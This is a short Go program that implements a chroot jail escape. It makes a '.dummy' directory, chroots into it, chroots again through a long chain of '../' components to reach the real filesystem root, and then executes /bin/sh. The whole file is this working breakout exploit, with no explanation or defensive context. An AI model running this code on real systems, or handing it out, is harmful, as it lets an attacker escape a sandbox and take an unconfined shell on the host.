package main

import (
	"os"
	"syscall"
)

func try(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	if _, err := os.Stat(".dummy"); os.IsNotExist(err) {
		try(os.Mkdir(".dummy", 0755))
	}
	try(syscall.Chroot(".dummy"))
	try(syscall.Chroot("../../../../../../../../../../../../../"))
	try(syscall.Exec("/bin/sh", []string{""}, os.Environ()))
}
